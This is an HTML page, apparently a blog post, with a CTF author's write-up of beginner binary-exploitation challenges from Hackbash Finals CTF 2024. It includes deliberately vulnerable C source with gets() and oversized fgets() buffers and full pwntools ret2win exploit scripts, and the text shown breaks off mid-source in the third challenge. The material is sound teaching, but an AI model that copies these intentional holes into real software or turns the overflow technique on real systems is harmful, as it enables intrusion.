@@ -1,0 +1,684 @@
+<!doctypehtml>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Hackbash Finals CTF 2024: Authors Writeup (pwn)</title>
+
+  <meta name="viewport"content="width=device-width,initial-scale=1">
+  <meta http-equiv="X-UA-Compatible"content="ie=edge">
+  <meta property="og:title"content="uhg's corner">
+  <meta property="og:image"content="https://i.ibb.co/4pRxk6j/trashthumbsup-c-websitethumb.png">
+  <meta property="og:description"content="vulnerability resarch, exploits and cve, ctf blog">
+  <meta property="og:url"content="https://ultimatehg.github.io">
+  <meta property="og:image:width"content="1200">
+  <meta property="og:image:height"content="627">
+  <meta property="og:type"content="website"> 
+
+  <link rel="shortcut icon"href="../assets/favicon.ico"type="image/x-icon">
+  <link rel="preload"href="../styles/article.css"as="style">
+  <link rel="stylesheet"href="../styles/article.css">
+</head>
+<body>
+  <header id="top-container"role="navigation">
+    <nav>
+  <a class="logo-link"href="/">
+    <h1>uhg's corner</h1>
+    <span>ctf_writeups | security_research | cs_stuff</span>
+  </a>
+  <small>
+    <a id="about"class="info-link"href="/about.html">👀About</a> /
+    <a id="works"class="info-link"href="/works.html">🔥Works</a> /
+    <a id="articles"class="info-link"href="/articles.html">📚Articles</a>
+  </small>
+</nav>
+
+  </header>
+  <main id="main-container">
+    <article id="article-container">
+      <h1 id="article-title">
+        Hackbash Finals CTF 2024: Authors Writeup (pwn)
+      </h1>
+      
+        <h2 id="article-subtitle">
+          Full Buffer Developer | Stackrunning 2077 | To (not) kill a canary
+        </h2>
+      
+      <time id="article-date">
+        2024.03.16
+      </time>
+      <section id="article-content-container">
+        <details><summary>Table of Contents</summary>
+<p><div class="table-of-contents"><ul><li><ul><li><a href="#foreword">Foreword</a></ul><li><a href="#full-buffer-developer-%F0%9F%8D%BC-%7C-17-solves">Full Buffer Developer 🍼 | 17 solves</a><li><a href="#stackrunning-2077-%7C-7-solves">Stackrunning 2077 | 7 solves</a><li><a href="#to-not-kill-a-canary-%F0%9F%92%80-%7C-1-solve">To not kill a canary 💀 | 1 solve</a><ul><li><a href="#extra-notes">Extra Notes</a><li><a href="#afterword">Afterword</a></ul></ul></div><p></p>
+</details>
+<h2 id="foreword"tabindex="-1">Foreword</h2>
+<p>These were the beginner pwn challenges that I created for Hackbash Finals CTF 2024.</p>
+<p>I would like to preface this by saying that even though I refer to these as beginner pwn challenges, it only applies only when looking at pwn challenges as a whole. Personally, I am really proud of the Hackbash participants for attempting these challenges. Starting with near zero knowledge on pwn and attempting these challenges after a simple 3-hour OS/Pwn workshop takes a lot of courage (pwn is not easy to start learning!), because the concepts explored in pwn can get quite advanced, especially for people with little to no low-level programming (stack manipulation, memory addressing etc.) background.</p>
+<p>For the following challenges, in the context of the CTF, 🍼 denotes that it is an easy challenge, no emoji denotes that it is an intermediate challenge, while 💀 denotes that it is a hard challenge. For context, there were 19 teams in total for the CTF.</p>
+<p>In the following writeups, I will go into as much detail as possible into the pwn concepts behind each of the challenges and also provide an example thought process for solving them.</p>
+<p>Actually, there was an error on my part on the deployment of the challenges which made them easier than what was intended, and I will also discuss that in the respective challenge explanations.</p>
+<p>For all the following challenges, we would be using <code>win+5</code>, I will explain at the end why this is the case in case anyone is interested.</p>
+<h1 id="full-buffer-developer-%F0%9F%8D%BC-%7C-17-solves"tabindex="-1">Full Buffer Developer 🍼 | 17 solves</h1>
+<p>Sure enough, this was an easy pwn challenge and most teams solved it. Let’s take a look at the source code first:</p>
+<pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">win</span><span class="hljs-params">()</span> {
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Good job :)\n&quot;</span>);
+    system(<span class="hljs-string">&quot;cat flag.txt&quot;</span>);
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
+    <span class="hljs-type">char</span> name[<span class="hljs-number">0x10</span>];
+    <span class="hljs-comment">//fix buffer for remote</span>
+    setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);
+    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);
+    setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-literal">NULL</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Is this stack overflow?\n&quot;</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter username:\n&quot;</span>);
+    fgets(name, <span class="hljs-number">0x20</span>, <span class="hljs-built_in">stdin</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Access denied &gt;:(\n&quot;</span>);
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre>
+<p>This is a short C program, let’s take a closer look at what each part of the code is trying to do.</p>
+<p>We can immediately see that there is a <code>win()</code> function, which prints “Good job :)” and then calls <code>system(&quot;cat flag.txt&quot;)</code>, so this is the function we are supposed to reach. Hence, this is a ret2win challenge.</p>
+<p>In the main function, we see a <code>char name[0x10]</code> being declared, which essentially is declaring a variable of type <code>char</code>, of name <code>name</code>, and of size <code>0x10</code>. Keep in mind that <code>0x10</code> is NOT <code>10</code>! <code>0x10</code> is in <em>hexadecimal</em>, which means that it is base 16 and not base 10.</p>
+<p>We can ignore the <code>setbuf()</code> lines.</p>
+<p>This part of the code asks for a user input, and takes it in with <code>fgets()</code>.</p>
+<pre class="hljs"><code><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Is this stack overflow?\n&quot;</span>);
+<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter username:\n&quot;</span>);
+fgets(name, <span class="hljs-number">0x20</span>, <span class="hljs-built_in">stdin</span>);
+<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Access denied &gt;:(\n&quot;</span>);
+</code></pre>
+<p>However, recalling that the variable <code>name</code> is of size <code>0x10</code>, but <code>fgets()</code> is reading <code>0x20</code> characters into <code>name</code>, we can see that this is a buffer overflow challenge.</p>
+<p>The layout of the stack at this point looks something like this:</p>
+<pre class="hljs"><code>┌──────────────────────┐
+│      name[0x10]      │
+├──────────────────────┤
+│      $rbp[0x08]      │
+├──────────────────────┤
+│ return pointer[0x08] │
+└──────────────────────┘
+</code></pre>
+<p>The return pointer is actually represented (specifically, in Intel x86_64) as $rip, which stands for Instruction Pointer.</p>
+<p>So with this knowledge in mind, we know that the first <code>0x10</code> bytes will fill up <code>name</code>, the next <code>0x8</code> bytes will overwrite (i.e. “fill up”) <code>$rbp</code>, and the last <code>0x8</code> bytes will overwrite the <code>$rip</code> (return pointer).</p>
+<p>Hence, our target payload should be something like: <code>0x10</code> (i.e. 16) bytes to fill up <code>name</code>, followed by <code>0x8</code> (i.e. 8) bytes to fill up <code>$rbp</code>, and the last <code>0x8</code> (i.e. 8) bytes to overwrite <code>$rip</code>.</p>
+<p>If we make use of pwntools, the script would look something like this:</p>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+<span class="hljs-comment"># Start process</span>
+p = process(<span class="hljs-string">&quot;./full_buffer_developer&quot;</span>)
+<span class="hljs-comment"># You would use something like</span>
+<span class="hljs-comment"># p = remote(&quot;some.providedwebsite.org&quot;, port_number)</span>
+<span class="hljs-comment"># replacing the website with the one we provided,</span>
+<span class="hljs-comment"># and port_number similarly with the one we provided</span>
+
+<span class="hljs-comment"># constructing the payload</span>
+pad = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>     <span class="hljs-comment"># to fill up &quot;name&quot;</span>
+rbp = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>        <span class="hljs-comment"># to fill up the rbp</span>
+win = p64(<span class="hljs-number">0x4011CD</span>) <span class="hljs-comment"># to overwrite rip with the address of win()</span>
+
+payload = pad+rbp+win <span class="hljs-comment"># form the payload!</span>
+
+<span class="hljs-comment"># Easy buffer overflow</span>
+p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, payload)
+<span class="hljs-comment"># recv until &quot;flag{&quot;, because this is when we</span>
+<span class="hljs-comment"># know for sure we are receiving the flag</span>
+p.recvuntil(<span class="hljs-string">&quot;flag{&quot;</span>)
+<span class="hljs-comment"># receive the rest of the flag and append</span>
+<span class="hljs-comment"># &quot;flag{&quot; in front</span>
+<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag{&quot;</span>+p.recvall())
+<span class="hljs-comment"># this isn&#x27;t necessary, but I like to clean</span>
+<span class="hljs-comment"># my output for a model solution :)</span>
+</code></pre>
+<h1 id="stackrunning-2077-%7C-7-solves"tabindex="-1">Stackrunning 2077 | 7 solves</h1>
+<p>This was a slightly harder buffer overflow challenge. And fun fact: I was supposed to release a source file with redacted variable values, but instead I mixed it up and released the full original source code. However, this shouldn’t have affected the way it is solved.</p>
+<p>For the purpose of learning the intended proper “pwn” way of thinking, I will be using source code with redacted values below.</p>
+<p>First let’s take a look at the source code (with redacted values).</p>
+<pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">setup</span><span class="hljs-params">()</span> {
+    setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>);
+    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);
+}
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">secret</span><span class="hljs-params">()</span> {
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You have reached the data core!\n&quot;</span>);
+    system(<span class="hljs-string">&quot;cat flag.txt&quot;</span>);
+}
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">stackrunner</span><span class="hljs-params">()</span> {
+    <span class="hljs-type">char</span> watchdog[<span class="hljs-number">0x10</span>] = <span class="hljs-string">&quot;[REDACTED]&quot;</span>;
+    <span class="hljs-type">char</span> verify[<span class="hljs-number">0x10</span>] = <span class="hljs-string">&quot;[REDACTED]&quot;</span>;
+    <span class="hljs-type">char</span> checker[<span class="hljs-number">0x10</span>] = <span class="hljs-string">&quot;[REDACTED]&quot;</span>;
+    <span class="hljs-type">char</span> mark2[<span class="hljs-number">0x10</span>] = <span class="hljs-string">&quot;[REDACTED]&quot;</span>;
+    <span class="hljs-type">char</span> password[<span class="hljs-number">0x10</span>] = <span class="hljs-string">&quot;[REDACTED]&quot;</span>;
+    <span class="hljs-type">char</span> mark[<span class="hljs-number">0x10</span>] = <span class="hljs-string">&quot;[REDACTED]&quot;</span>;
+    <span class="hljs-type">char</span> input[<span class="hljs-number">0x10</span>];
+
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0;93mEntering hackbash secure space...\n\n\n&quot;</span>);
+    sleep(<span class="hljs-number">1</span>);
+
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;██╗░░██╗░█████╗░░█████╗░██╗░░██╗██████╗░░█████╗░░██████╗██╗░░██╗  ░██████╗███████╗░█████╗░██╗░░░██╗██████╗░███████╗\n&quot;</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;██║░░██║██╔══██╗██╔══██╗██║░██╔╝██╔══██╗██╔══██╗██╔════╝██║░░██║  ██╔════╝██╔════╝██╔══██╗██║░░░██║██╔══██╗██╔════╝\n&quot;</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;███████║███████║██║░░╚═╝█████═╝░██████╦╝███████║╚█████╗░███████║  ╚█████╗░█████╗░░██║░░╚═╝██║░░░██║██████╔╝█████╗░░\n&quot;</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;██╔══██║██╔══██║██║░░██╗██╔═██╗░██╔══██╗██╔══██║░╚═══██╗██╔══██║  ░╚═══██╗██╔══╝░░██║░░██╗██║░░░██║██╔══██╗██╔══╝░░\n&quot;</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;██║░░██║██║░░██║╚█████╔╝██║░╚██╗██████╦╝██║░░██║██████╔╝██║░░██║  ██████╔╝███████╗╚█████╔╝╚██████╔╝██║░░██║███████╗\n&quot;</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝  ╚═════╝░╚══════╝░╚════╝░░╚═════╝░╚═╝░░╚═╝╚══════╝\n\n&quot;</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;░██████╗██████╗░░█████╗░░█████╗░███████╗\n&quot;</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝\n&quot;</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;╚█████╗░██████╔╝███████║██║░░╚═╝█████╗░░\n&quot;</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;░╚═══██╗██╔═══╝░██╔══██║██║░░██╗██╔══╝░░\n&quot;</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;██████╔╝██║░░░░░██║░░██║╚█████╔╝███████╗\n&quot;</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;╚═════╝░╚═╝░░░░░╚═╝░░╚═╝░╚════╝░╚══════╝\n&quot;</span>);
+
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n\n\033[0;39mPlease enter your input: &quot;</span>);
+    gets(input);
+
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nVerifying...\n&quot;</span>);
+    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span>(input, password, <span class="hljs-number">16</span>)) {
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0;31mPassword is wrong, stackrunning failed.\033[0;39m\n&quot;</span>);
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
+    }
+
+    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span>(mark, mark2, <span class="hljs-number">16</span>)) {
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0;31mMark verification failed, stackrunning failed.\033[0;39m\n&quot;</span>);
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
+    }
+
+    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span>(checker, <span class="hljs-string">&quot;OWEa8iZOfQIFQyl1&quot;</span>, <span class="hljs-number">16</span>)) {
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0;31mIntrusion detected, stackrunning failed.\033[0;39m\n&quot;</span>);
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
+    }
+
+    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span>(watchdog, <span class="hljs-string">&quot;CHhMf9iW0F21LC74&quot;</span>, <span class="hljs-number">16</span>)) {
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0;31mWatchdog alerted, stackrunning failed.\033[0;39m\n&quot;</span>);
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
+    }
+
+    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span>(verify, password, <span class="hljs-number">16</span>)) {
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0;31mPassword modified, stackrunning failed.\033[0;39m\n&quot;</span>);
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
+    }
+
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nVerification complete. User does not have access to requested file.\n&quot;</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Exiting...\n&quot;</span>);
+}
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
+    setup();
+    stackrunner();
+}
+</code></pre>
+<p>It might seem like a long block of code at first, but most of it is really just printing strings. Let’s simplify the code a bit and break it down.</p>
+<p>We can see a <code>secret()</code> function that calls <code>system(&quot;cat flag.txt&quot;)</code>. This is the function that we want to reach! This is another ret2win challenge.</p>
+<p>We look at the following part of the code, it declares some variables:</p>
+<pre class="hljs"><code><span class="hljs-type">char</span> watchdog[<span class="hljs-number">0x10</span>] = <span class="hljs-string">&quot;[REDACTED]&quot;</span>;
+<span class="hljs-type">char</span> verify[<span class="hljs-number">0x10</span>] = <span class="hljs-string">&quot;[REDACTED]&quot;</span>;
+<span class="hljs-type">char</span> checker[<span class="hljs-number">0x10</span>] = <span class="hljs-string">&quot;[REDACTED]&quot;</span>;
+<span class="hljs-type">char</span> mark2[<span class="hljs-number">0x10</span>] = <span class="hljs-string">&quot;[REDACTED]&quot;</span>;
+<span class="hljs-type">char</span> password[<span class="hljs-number">0x10</span>] = <span class="hljs-string">&quot;[REDACTED]&quot;</span>;
+<span class="hljs-type">char</span> mark[<span class="hljs-number">0x10</span>] = <span class="hljs-string">&quot;[REDACTED]&quot;</span>;
+<span class="hljs-type">char</span> input[<span class="hljs-number">0x10</span>];
+</code></pre>
+<p>The variables will be declared and pushed onto the stack sequentially, hence <code>watchdog</code> would be at the bottom of the stack whereas <code>input</code> would be at the top of the stack. We will get back to this later.</p>
+<p>This part of the code takes in a user input and stores it into <code>input</code>, however it does not limit the number of characters that you can input, which leads to a buffer overflow vulnerability:</p>
+<pre class="hljs"><code><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n\n\033[0;39mPlease enter your input: &quot;</span>);
+gets(input);
+</code></pre>
+<p>In these following parts of the code, we can see that a few checks need to be passed:</p>
+<pre class="hljs"><code><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span>(input, password, <span class="hljs-number">16</span>)) {
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0;31mPassword is wrong, stackrunning failed.\033[0;39m\n&quot;</span>);
+    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
+}
+</code></pre>
+<p><code>input</code> must be equals to <code>password</code></p>
+<pre class="hljs"><code><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span>(mark, mark2, <span class="hljs-number">16</span>)) {
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0;31mMark verification failed, stackrunning failed.\033[0;39m\n&quot;</span>);
+    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
+}
+</code></pre>
+<p><code>mark</code> must be equals to <code>mark2</code></p>
+<pre class="hljs"><code><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span>(checker, <span class="hljs-string">&quot;OWEa8iZOfQIFQyl1&quot;</span>, <span class="hljs-number">16</span>)) {
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0;31mIntrusion detected, stackrunning failed.\033[0;39m\n&quot;</span>);
+    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
+}
+</code></pre>
+<p><code>checker</code> must be equals to the string “<code>OWEa8iZOfQIFQyl1</code>”</p>
+<pre class="hljs"><code><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span>(watchdog, <span class="hljs-string">&quot;CHhMf9iW0F21LC74&quot;</span>, <span class="hljs-number">16</span>)) {
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0;31mWatchdog alerted, stackrunning failed.\033[0;39m\n&quot;</span>);
+    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
+}
+</code></pre>
+<p><code>watchdog</code> must be equals to the string “<code>CHhMf9iW0F21LC74</code>”</p>
+<pre class="hljs"><code><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span>(verify, password, <span class="hljs-number">16</span>)) {
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0;31mPassword modified, stackrunning failed.\033[0;39m\n&quot;</span>);
+    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
+}
+</code></pre>
+<p><code>verify</code> must be equals to <code>password</code></p>
+<p>With these conditions in mind, let’s visualize our stack layout. Remember as discussed earlier, the variables are pushed onto the stack sequentially. From hereon out, I will be referring to the return pointer as <code>$rip</code>.</p>
+<pre class="hljs"><code>┌──────────────────────┐
+│     input[0x10]      │
+├──────────────────────┤
+│      mark[0x10]      │
+├──────────────────────┤
+│    password[0x10]    │
+├──────────────────────┤
+│     mark2[0x10]      │
+├──────────────────────┤
+│    checker[0x10]     │
+├──────────────────────┤
+│     verify[0x10]     │
+├──────────────────────┤
+│    watchdog[0x10]    │
+├──────────────────────┤
+│      $rbp[0x08]      │
+├──────────────────────┤
+│      $rip[0x08]      │
+└──────────────────────┘
+</code></pre>
+<p>Hence, as we have a buffer overflow and we start writing from <code>input</code>, we will write in the order as shown above. The payload would hence be:</p>
+<pre class="hljs"><code>&quot;a&quot; x 16 to fill up input
+          +
+&quot;a&quot; x 16 to fill up mark
+          +
+&quot;a&quot; x 16 to fill up password
+-- this will fulfill the input = password check,
+-- as both are equals to &quot;a&quot; x 16
+          +
+&quot;a&quot; x 16 to fill up mark2
+-- this will fulfill the mark = mark2 check,
+-- as both are equals to &quot;a&quot; x 16
+          +
+&quot;OWEa8iZOfQIFQyl1&quot; to fill up checker
+-- this will fulfill the checker string compare check
+          +
+&quot;a&quot; x 16 to fill up verify
+-- this will fulfill the verify = password check,
+-- as both are equals to &quot;a&quot; x 16
+          +
+&quot;CHhMf9iW0F21LC74&quot; to fill up watchdog
+-- this will fulfill the watchdog string compare check
+          +
+&quot;a&quot; x 8 to fill up $rbp
+          +
+address of secret() to fill up $rip
+</code></pre>
+<p>The recommended method is to use <code>gdb</code> debugger in order to disassemble <code>secret()</code> in order to find its address. Now that we know the structure of the payload, we just need to put it into python and send it to our server.</p>
+<p>With pwntools, the script would look something like this:</p>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+<span class="hljs-comment"># Run binary</span>
+p = process(<span class="hljs-string">&quot;./challenge&quot;</span>)
+<span class="hljs-comment"># You would use something like</span>
+<span class="hljs-comment"># p = remote(&quot;some.providedwebsite.org&quot;, port_number)</span>
+<span class="hljs-comment"># replacing the website with the one we provided,</span>
+<span class="hljs-comment"># and port_number similarly with the one we provided</span>
+
+<span class="hljs-comment"># building the payload</span>
+payload = <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">16</span>                <span class="hljs-comment"># input</span>
+payload += <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">16</span>               <span class="hljs-comment"># mark</span>
+payload += <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">16</span>               <span class="hljs-comment"># mark 2</span>
+payload += <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">16</span>               <span class="hljs-comment"># password</span>
+payload += <span class="hljs-string">b&quot;OWEa8iZOfQIFQyl1&quot;</span>   <span class="hljs-comment"># checker</span>
+payload += <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">16</span>               <span class="hljs-comment"># verify</span>
+payload += <span class="hljs-string">b&quot;CHhMf9iW0F21LC74&quot;</span>   <span class="hljs-comment"># watchdog</span>
+payload += <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">8</span>                <span class="hljs-comment"># rbp</span>
+payload += p64(<span class="hljs-number">0x40124e</span>)         <span class="hljs-comment"># secret()</span>
+
+p.sendlineafter(<span class="hljs-string">b&#x27;input: &#x27;</span>, payload)
+<span class="hljs-comment"># recv until &quot;flag{&quot;, because this is when we</span>
+<span class="hljs-comment"># know for sure we are receiving the flag</span>
+p.recvuntil(<span class="hljs-string">&quot;flag{&quot;</span>)
+<span class="hljs-comment"># receive the rest of the flag and append</span>
+<span class="hljs-comment"># &quot;flag{&quot; in front</span>
+<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag{&quot;</span>+p.recvall())
+<span class="hljs-comment"># this isn&#x27;t necessary, but I like to clean</span>
+<span class="hljs-comment"># my output for a model solution :)</span>
+</code></pre>
+<h1 id="to-not-kill-a-canary-%F0%9F%92%80-%7C-1-solve"tabindex="-1">To not kill a canary 💀 | 1 solve</h1>
+<p>I was quite surprised that someone solved it as for all intents and purposes of Hackbash Finals CTF, this was meant to be an extremely hard or even unsolveable challenge. I did give a big hint near the end to try to get some people to solve it as I saw quite a few teams attempting this when I was walking around. Kudos to anyone that even attempted this, this was definitely a behemoth of a challenge. I will try to break down each part of the code as clearly as I can.</p>
+<p>Similarly to the previous challenge, I was supposed to release a source file with redacted variable values, but instead I mixed it up and released the full original source code. However, this similarly shouldn’t have affected the way it is solved very much.</p>
+<p>Also similarly to the previous challenge, for the purpose of learning the intended proper “pwn” way of thinking, I will be using source code with redacted values below.</p>
+<p>This is the source file:</p>
+<pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">setup</span><span class="hljs-params">()</span> {
+    setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>);
+    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);
+}
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">escape</span><span class="hljs-params">()</span> {
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;My canary has escaped!\n&quot;</span>);
+    system(<span class="hljs-string">&quot;cat flag.txt&quot;</span>);
+}
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">pet</span><span class="hljs-params">()</span> {
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You pet the canary :)\n&quot;</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n\n\n\n&quot;</span>);
+    cage();
+}
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">talk</span><span class="hljs-params">()</span> {
+    <span class="hljs-type">char</span> input[<span class="hljs-number">0x10</span>];
+    <span class="hljs-type">char</span> password[<span class="hljs-number">0x10</span>] = <span class="hljs-string">&quot;[REDACTED]&quot;</span>;
+
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;What do you want to say?\n&quot;</span>);
+    fgets(input, <span class="hljs-number">0x30</span>, <span class="hljs-built_in">stdin</span>);
+    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strncmp</span>(input, password, <span class="hljs-number">16</span>)) {
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Here&#x27;s the canary!\n&quot;</span>);
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%11$p&quot;</span>);
+    } <span class="hljs-keyword">else</span> {
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The canary echoes back what you said:\n%s\n&quot;</span>, input);
+    }
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n\n\n\n&quot;</span>);
+    cage();
+}
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">poison</span><span class="hljs-params">()</span> {
+    <span class="hljs-type">char</span> input[<span class="hljs-number">0x10</span>];
+
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Input your poison:\n&quot;</span>);
+    gets(input);
+}
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">cage</span><span class="hljs-params">()</span> {
+    <span class="hljs-type">char</span> input[<span class="hljs-number">4</span>];
+    <span class="hljs-type">int</span> choice;
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0;33m&quot;</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;▀█▀ █▀█  \033[0;31m ▄▀ █▄░█ █▀█ ▀█▀ ▀▄ \033[0;33m  █▄▀ █ █░░ █░░   ▄▀█   █▀▀ ▄▀█ █▄░█ ▄▀█ █▀█ █▄█\n&quot;</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;░█░ █▄█  \033[0;31m ▀▄ █░▀█ █▄█ ░█░ ▄▀ \033[0;33m  █░█ █ █▄▄ █▄▄   █▀█   █▄▄ █▀█ █░▀█ █▀█ █▀▄ ░█░\n&quot;</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[1;36mDid you know? Canaries were used in history\n&quot;</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;as an early warning for toxic gases, as the birds are\n&quot;</span>);
